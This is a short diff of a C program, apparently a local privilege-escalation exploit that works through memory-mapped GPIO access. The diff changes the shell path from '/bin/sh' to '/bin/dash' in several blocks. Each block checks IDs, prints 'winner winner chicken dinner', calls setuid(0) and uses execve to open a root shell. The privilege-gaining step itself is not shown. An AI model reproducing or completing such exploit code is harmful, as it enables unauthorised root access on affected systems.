@@ -15,7 +15,7 @@
 #define PAGE_SIZE (4*1024)
 #define BLOCK_SIZE (4*1024)
 
-char *newargv[] = {NULL,"/bin/sh",NULL};
+char *newargv[] = {NULL,"/bin/dash",NULL};
 
 int  mem_fd;
 void *gpio_map;
@@ -108,8 +108,8 @@ GPIO_CLR = 1 << 4;
     printf("gri:%d/%d/%d",id0,id1,id2);
     fflush(stdout);
     setuid(0);
-    execve("/bin/sh",newargv,0);
-    // system("/bin/sh");
+    execve("/bin/dash",newargv,0);
+    // system("/bin/dash");
   }
 
 
@@ -119,8 +119,8 @@ GPIO_CLR = 1 << 4;
     printf("winner winner chicken dinner (getresuid)");
     fflush(stdout);
     // setuid(0);
-    execve("/bin/sh",newargv,0);
-    // execve("/bin/sh",0,0);
+    execve("/bin/dash",newargv,0);
+    // execve("/bin/dash",0,0);
   }
 
   printf("gri:%d/%d/%d",id0,id1,id2);
@@ -130,7 +130,7 @@ GPIO_CLR = 1 << 4;
     printf("winner winner chicken dinner (geteuid)");
     fflush(stdout);
     // setuid(0);
-    execve("/bin/sh",newargv,0);
+    execve("/bin/dash",newargv,0);
   }
 
   return 0;
